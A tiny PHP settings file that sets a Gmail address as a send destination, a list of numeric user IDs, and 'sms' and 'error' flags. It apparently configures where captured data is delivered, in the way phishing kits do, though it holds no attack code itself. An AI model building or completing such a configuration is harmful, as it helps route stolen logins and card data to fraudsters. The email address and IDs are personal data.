<?php
$send = "nonames818@gmail.com";
$user_ids=array("1157941895");
$sms='1';
$error='1';
?>
